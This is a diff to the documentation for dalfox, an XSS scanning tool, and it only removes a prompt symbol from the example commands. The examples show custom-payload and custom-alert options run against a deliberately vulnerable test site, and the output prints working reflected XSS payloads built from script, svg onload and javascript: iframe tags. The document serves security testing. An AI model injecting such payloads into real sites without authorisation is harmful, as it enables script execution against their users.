@@ -8,7 +8,7 @@ layout: page
 
 ## Custom payload
 ```
-▶ dalfox url --custom-payload payload-list.txt
+dalfox url --custom-payload payload-list.txt
 ```
 
 ## Custom alert 
@@ -22,7 +22,7 @@ str: `"PAYLOAD"` / `'PAYLOAD'`
 ### Case of study
 default (no option)
 ```
-▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123
+dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123
 ...snip...
 [V] Triggered XSS Payload (found DOM Object): cat=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>
     48 line:  yntax to use near '=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>' at line 1
@@ -31,7 +31,7 @@ default (no option)
 
 used options - only value
 ```
-▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337
+dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337
 ...snip...
 [V] Triggered XSS Payload (found DOM Object): cat='><sVg/onload=alert(1337) class=dalfox>
     48 line:  syntax to use near ''><sVg/onload=alert(1337) class=dalfox>' at line 1
@@ -40,7 +40,7 @@ used options - only value
 
 used options - with type=str
 ```
-▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337 --custom-alert-type str
+dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337 --custom-alert-type str
 ...snip...
 [V] Triggered XSS Payload (found DOM Object): cat=<svG/onload=confirm("1337") class=dalfox>
     48 line:  yntax to use near '=<svG/onload=confirm("1337") class=dalfox>' at line 1
@@ -49,7 +49,7 @@ used options - with type=str
 
 used options - with type=none,str
 ```
-▶ dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337 --custom-alert-type str,int
+dalfox url http://testphp.vulnweb.com/listproducts.php\?artist\=123 --custom-alert-value 1337 --custom-alert-type str,int
 ...snip...
 [V] Triggered XSS Payload (found DOM Object): cat="><iFrAme/src=jaVascRipt:alert('1337') class=dalfox></iFramE>
     48 line:  syntax to use near '"><iFrAme/src=jaVascRipt:alert('1337') class=dalfox></iFramE
